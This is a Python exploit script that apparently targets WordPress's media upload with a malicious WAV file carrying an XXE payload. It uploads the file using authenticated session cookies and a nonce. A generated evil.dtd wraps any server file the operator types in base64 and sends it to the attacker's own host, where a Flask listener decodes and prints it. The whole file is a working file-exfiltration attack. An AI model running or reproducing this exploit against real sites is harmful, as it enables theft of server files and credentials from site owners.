import argparse
import sys
import threading
from os import popen, system, environ
import logging
import requests
from time import sleep
from flask import Flask, request, send_from_directory
from dotenv import load_dotenv
from base64 import b64decode


def info(s: str):
    print(f"[+] {s}")


def error(s: str, leave: bool = True):
    print(f"[-] {s}", file=sys.stderr)
    if leave is True:
        exit(1)


def verbose(s: str):
    if args.verbose:
        print(f"[$] {s}")


def create_payload():
    # Create the payload using the malicious_wav_generator script
    try:
        system(
            f'node ./malicious_wav_generator/index.js {args.lhost} {args.lport}')
        info("Payload created")
        return 1
    except:
        error("Error creating payload")


def send_payload():
    # Send the payload to the target
    try:
        url = args.url + "wp-admin/async-upload.php"
        res = requests.post(url, cookies={
            "wordpress_test_cookie": "WP+Cookie+check",
            f"wordpress_{args.cookie_hash}": args.cookie_wordpress,
            f"wordpress_logged_in_{args.cookie_hash}": args.cookie_logged
        }, files={
            'async-upload': ('payload.wav', open('payloads/malicious.wav', 'rb')),
        },
            data={
            'name': 'payload.wav',
            '_wpnonce': args.nonce,
            'html-upload': 'Upload'
        },
            proxies={
                'http': args.proxy if args.proxy else None,
                'https': args.proxy if args.proxy else None
        })

        # Check if the payload was sent
        if res.status_code == 200:
            verbose("Payload sent")
            return 1
        error(
            f"Error sending payload: {res.status_code} {res.reason}", leave=False)

    except Exception as e:
        error(f"Error sending payload:\n{e}", leave=False)


def modify_file(file: str):
    # Modify evil.dtd to include the file to be read
    with open('payloads/evil.dtd', 'w') as f:
        evil_dtd = f'''<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource={file}">
<!ENTITY % init "<!ENTITY &#37; trick SYSTEM 'http://{args.lhost}:{args.lport}/response?p=%file;'>" >
'''
        f.write(evil_dtd)
        verbose(f"evil.dtd modified for {file}")


def decode(b64: str):
    try:
        verbose(f'Decoding base64 string')
        return b64decode(b64).decode('utf-8')
    except Exception as e:
        error(f"Error decoding the payload:\n{e}")


flask = Flask(__name__, static_url_path='')


def create_server():
    try:
        @ flask.route('/ping')
        def ping():
            if request.remote_addr == args.lhost:
                verbose(f'Received local ping request')
            else:
                # This should never happen
                verbose(f'Received ping request from {request.remote_addr}')

            return "pong"

        @ flask.route('/response')
        def decrypt():
            # Decrypt the payload and print it
            verbose(f"Received encoded file from {request.remote_addr}")
            f = decode(request.args.get('p'))
            print()
            print(f)
            return f

        @ flask.route('/payload')
        def evil():
            # Send the evil.dtd file
            verbose(f"Request from {request.remote_addr} for evil.dtd")
            return send_from_directory('payloads', 'evil.dtd')

        flask.run(host=args.lhost, port=args.lport)

    except Exception as e:
        error(f"Error creating server:\n{e}")


def server_alive() -> bool:
    try:
        for _ in range(10):
            res = requests.get(f"http://{args.lhost}:{args.lport}/ping")
            if res.status_code == 200:
                info("Server is alive")
                return True
            else:
                error(
                    f"Invalid ping response {res.status_code} {res.reason}", leave=False)
            sleep(1)
        error(f'Could not connect to the local server')

    except:
        error("Error checking if server is alive")


if __name__ == "__main__":
    load_dotenv()

    logging.getLogger('werkzeug').setLevel(logging.CRITICAL)

    argparser = argparse.ArgumentParser()
    argparser.add_argument("-u", '--url', help="The target URL",
                           default=environ.get('TARGET'))
    argparser.add_argument(
        "-l", '--lhost', help="The attacker's IP address", default=environ.get('LHOST'))
    argparser.add_argument(
        "-p", '--lport', help="The attacker's port", default=(environ.get('LPORT') or 8001))
    argparser.add_argument("-cH", '--cookie-hash',
                           help='The hash used in Wordpress cookies', default=environ.get('HASH'))
    argparser.add_argument("-cW", '--cookie-wordpress',
                           help="The cookie of the wordpress session (wordpress_[hash])", default=environ.get('WORDPRESS_COOKIE'))
    argparser.add_argument("-cL", '--cookie-logged',
                           help="The cookie of the logged session (wordpress_logged_in_[hash])", default=environ.get('WORDPRESS_LOGGED_IN_COOKIE'))
    argparser.add_argument(
        '-n', '--nonce', help="The nonce of the Wordpress session", default=environ.get('NONCE'))
    argparser.add_argument(
        '-pr', '--proxy', help="The proxy to use (http://host:port)", default=(environ.get('PROXY') or None))
    argparser.add_argument(
        '-v', '--verbose', help='Verbose mode', action='store_true', default=False)

    args = argparser.parse_args()

    if not args.url:
        error("Please specify the target URL")

    if not args.lhost:
        error("Please specify the attacker's IP address")

    if not args.cookie_hash:
        error("Please specify the cookie hash")

    if not args.cookie_wordpress:
        error("Please specify the Wordpress cookie")

    if not args.cookie_logged:
        error("Please specify the logged cookie")

    if not args.nonce:
        error("Please specify the nonce")

    if args.proxy:
        verbose(f"Using proxy {args.proxy}")

    def print_info():
        info(f'Target URL: {args.url}')
        info(f'Local Address: {args.lhost}:{args.lport}')
        verbose(f'Cookie hash: {args.cookie_hash}')
        verbose(f'Wordpress cookie: {args.cookie_wordpress}')
        verbose(f'Logged cookie: {args.cookie_logged}')
        verbose(f'Nonce: {args.nonce}')

        if args.proxy:
            info(f'Proxy: {args.proxy}')
        else:
            verbose(f'Proxy: None')

        print()
        info('Ready to go!')
        print()

    print_info()
    create_payload()
    threading.Thread(target=create_server, ).start()
    if server_alive():
        print()
        while True:
            modify_file(input("$/wp-admin/ -> "))
            send_payload()
